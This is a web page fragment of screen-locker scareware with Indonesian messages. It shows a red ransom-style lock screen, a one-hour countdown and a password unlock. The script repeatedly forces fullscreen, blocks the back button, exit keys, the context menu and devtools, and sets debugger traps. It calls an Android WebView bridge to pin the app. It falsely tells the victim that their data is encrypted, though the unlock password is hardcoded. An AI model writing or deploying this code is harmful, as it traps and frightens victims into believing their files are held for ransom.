    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            touch-action: none;
        }
        .lock {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(145deg, #1a0000 0%, #3f0000 100%);
            border: 4px solid #ff3333;
            box-shadow: inset 0 0 60px #ff0000, 0 0 50px #ff0000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 10px;
            z-index: 999999;
            color: white;
            text-shadow: 1px 1px 3px #200000;
        }
        .lock::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, transparent 2px, transparent 5px);
            pointer-events: none;
            animation: scan 8s linear infinite;
        }
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: rgba(8, 0, 0, 0.95);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1.5px solid #ff6666;
            border-radius: 30px;
            padding: 18px 16px;
            box-shadow: 0 0 60px #ff0000;
            text-align: center;
            position: relative;
            z-index: 20;
        }
        .icon {
            font-size: 52px;
            line-height: 1;
            margin-bottom: 4px;
            filter: drop-shadow(0 0 12px #ff4444);
            animation: pulse 1.4s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.9; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.05); text-shadow: 0 0 20px #ff6666; }
            100% { opacity: 0.9; transform: scale(1); }
        }
        h1 {
            font-size: 1.6rem;
            font-weight: 900;
            color: #ff7777;
            margin-bottom: 8px;
            text-transform: uppercase;

            text-shadow: 0 0 12px #ff0000;

        .photo {

            width: 100%;
            max-width: 160px;
            margin: 8px auto;
            box-shadow: 0 0 25px #ff0000;

        }
        .photo img {

            display: block;
            filter: contrast(1.2) brightness(0.9);
        }
        .timer {
            background: #2a0000;
            border: 1.5px solid #ff4444;
            border-radius: 50px;
            padding: 8px;
            margin: 10px 0;
            box-shadow: inset 0 0 15px #ff0000;
        }
        .timer span {
            font-size: 0.75rem;
            color: #ffbbbb;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        #timer {
            font-size: 2.2rem;
            font-weight: 800;
            font-family: 'Courier New', monospace;
            color: #ff3333;
            line-height: 1.2;
            text-shadow: 0 0 15px #ff0000, 0 0 25px #ff0000;
        }
        .info {
            background: rgba(255, 60, 60, 0.1);
            border-left: 4px solid #ff4444;
            padding: 10px;
            border-radius: 16px;
            margin: 10px 0;
            text-align: left;
            font-size: 0.9rem;
            word-break: break-word;
        }
        .btn {
            display: inline-block;
            background: #25D366;
            color: white;
            font-weight: 700;
            font-size: 1.3rem;
            padding: 12px 20px;
            border-radius: 50px;
            text-decoration: none;
            margin: 10px 0 8px;
            box-shadow: 0 5px 0 #128C7E, 0 10px 20px black;
            transition: 0.08s linear;
            border: 1.5px solid white;
            width: 100%;
            max-width: 260px;
        }
        .btn:active {
            transform: translateY(5px);
            box-shadow: 0 2px 0 #128C7E, 0 8px 15px black;
        }
        .secret-area {
            width: 40px;
            height: 20px;
            margin: 8px auto 0;
            background: transparent;
            cursor: crosshair;
            border-radius: 10px;
        }
        .secret-area:hover {
            background: rgba(255, 0, 0, 0.2);
        }
        #password-display {
            color: #aafaaa;
            font-size: 0.9rem;
            min-height: 22px;
            margin-top: 5px;
            padding: 3px 10px;
            border-radius: 20px;
            background: rgba(0, 0, 0, 0.6);
            display: inline-block;
            visibility: hidden;
        }
        .input-group {
            margin: 15px 0 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }
        .input-group input {
            width: 100%;
            max-width: 220px;
            padding: 12px 15px;
            background: #330000;
            border: 2px solid #ff4444;
            border-radius: 50px;
            color: white;
            font-size: 1rem;
            text-align: center;
            outline: none;
            user-select: text;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
        }
        .input-group input::placeholder {
            color: #aa5555;
            text-align: center;
        }
        .unlock-btn {
            background: #ff4444;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            padding: 10px 30px;
            border: none;
            border-radius: 50px;
            box-shadow: 0 4px 0 #990000;
            transition: 0.08s linear;
            width: 100%;
            max-width: 220px;
            cursor: pointer;
        }
        .unlock-btn:active {
            transform: translateY(4px);
            box-shadow: 0 1px 0 #990000;
        }
        #message {
            color: #ffaaaa;
            font-size: 0.85rem;
            min-height: 20px;
        }
        body, .lock { overflow: hidden; }
        .pin-status {
            font-size: 0.7rem;
            color: #ffaa00;
            margin-top: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
    </style>
</head>

    <script>
        (function(){
            // ========== TIMER 1 JAM ==========
            let end = new Date().getTime() + 60 * 60 * 1000;
            const timerEl = document.getElementById('timer');
            
            function updateTimer() {
                let now = new Date().getTime();
                let dist = end - now;
                if (dist <= 0) {
                    timerEl.innerText = '00:00:00';
                    return;
                }
                let h = Math.floor(dist / 3600000);
                let m = Math.floor((dist % 3600000) / 60000);
                let s = Math.floor((dist % 60000) / 1000);
                timerEl.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            }
            updateTimer();
            setInterval(updateTimer, 1000);

            // ========== PASSWORD TERSEMBUNYI 250511 ==========
            const secret = document.getElementById('secretClick');
            const passDisplay = document.getElementById('password-display');
            let clickCount = 0;
            let timeoutId;
            const correctPassword = "250511";

            secret.addEventListener('click', function() {
                clickCount++;
                if (timeoutId) clearTimeout(timeoutId);
                timeoutId = setTimeout(() => {
                    clickCount = 0;
                    passDisplay.style.visibility = 'hidden';
                }, 800);

                if (clickCount >= 5) {
                    passDisplay.innerHTML = `üîì PASSWORD: ${correctPassword}`;
                    passDisplay.style.visibility = 'visible';
                    clickCount = 0;
                    clearTimeout(timeoutId);
                }
            });

            // ========== CEK APAKAH DIJALANKAN DI ANDROID ==========
            const isAndroid = /Android/i.test(navigator.userAgent);
            const pinStatus = document.getElementById('pinStatus');
            
            // ========== PANGGIL ANDROID UNTUK PIN/UNPIN ==========
            function callAndroidPin() {
                if (isAndroid && window.Android) {
                    try {
                        // Beritahu Android bahwa halaman sudah siap
                        pinStatus.innerText = 'üîí MENGUNCI APLIKASI...';
                        Android.onPageReady();
                    } catch(e) {
                        console.log('Android interface error:', e);
                    }
                } else {
                    pinStatus.innerText = '‚ö†Ô∏è MODE WEB - TIDAK TERKUNCI';
                }
            }
            
            function callAndroidUnpin() {
                if (isAndroid && window.Android) {
                    try {
                        Android.unlockApp();
                        pinStatus.innerText = '‚úÖ APLIKASI TERBUKA - UNPINNED';
                    } catch(e) {
                        console.log('Android unpin error:', e);
                        pinStatus.innerText = '‚ùå GAGAL UNPIN';
                    }
                } else {
                    alert('‚úÖ Password benar! (Mode Web)');
                }
            }

            // ========== VALIDASI PASSWORD ==========
            const passwordInput = document.getElementById('passwordInput');
            const unlockBtn = document.getElementById('unlockBtn');
            const message = document.getElementById('message');

            // Variabel untuk menyimpan interval full screen
            let fullInterval;
            let fullScreenActive = true;

            // Fungsi request full screen
            function requestFull() {
                if (fullScreenActive && !document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(() => {});
                }
            }

            // Panggil sekali di awal
            requestFull();
            fullInterval = setInterval(requestFull, 1500);

            // Listener fullscreen change
            document.addEventListener('fullscreenchange', function() {
                if (fullScreenActive && !document.fullscreenElement) {
                    setTimeout(requestFull, 100);
                }
            });

            // Panggil Android untuk pin setelah halaman dimuat
            window.addEventListener('load', function() {
                // Beri sedikit jeda agar WebView siap
                setTimeout(callAndroidPin, 1000);
            });

            // Event listener untuk unlock
            unlockBtn.addEventListener('click', function() {
                const entered = passwordInput.value.trim();
                if (entered === correctPassword) {
                    message.innerHTML = '‚úÖ PASSWORD BENAR! MEMBUKA KUNCI...';
                    message.style.color = '#aaffaa';
                    
                    // Hentikan force full screen
                    if (fullInterval) {
                        clearInterval(fullInterval);
                        fullInterval = null;
                    }
                    fullScreenActive = false;
                    
                    // Panggil Android untuk unpin
                    callAndroidUnpin();
                    
                    // Simulasi sukses
                    setTimeout(() => {
                        alert('‚úÖ DEKRIPSI BERHASIL! File Anda kembali normal.');
                    }, 1000);
                } else {
                    message.innerHTML = '‚ùå PASSWORD SALAH! COBA LAGI.';
                    message.style.color = '#ffaaaa';
                }
                passwordInput.value = '';
            });

            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    unlockBtn.click();
                }
            });

            // ========== PENGUNCIAN TAMBAHAN ==========
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function() {
                history.pushState(null, null, location.href);
                alert('üîí Akses ditolak!');
            });

            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'F11' || e.key === 'Escape' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
                    (e.ctrlKey && (e.key === 'r' || e.key === 'R' || e.key === 'w' || e.key === 'W' || e.key === 'u' || e.key === 'U'))) {
                    e.preventDefault();
                    alert('üîí Fungsi ini dinonaktifkan!');
                }
                if (e.altKey && e.key === 'F4') {
                    e.preventDefault();
                    alert('üîí Tidak bisa keluar!');
                }
            });

            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '‚ö†Ô∏è DATA ANDA TERENKRIPSI! Jangan tinggalkan halaman ini.';
                return '‚ö†Ô∏è DATA ANDA TERENKRIPSI! Jangan tinggalkan halaman ini.';
            });

            setInterval(function() {
                debugger;
            }, 200);

            (function() {
                let devtools = false;
                const element = new Image();
                Object.defineProperty(element, 'id', {
                    get: function() {
                        devtools = true;
                        alert('üîí DevTools terdeteksi! Halaman akan ditutup.');
                        window.close();
                    }
                });
                setInterval(() => {
                    devtools = false;
                    console.log(element);
                }, 1000);
            })();

            document.addEventListener('touchmove', function(e) {
                e.preventDefault();
            }, { passive: false });
            document.addEventListener('gesturestart', function(e) {
                e.preventDefault();
            });
        })();
    </script>
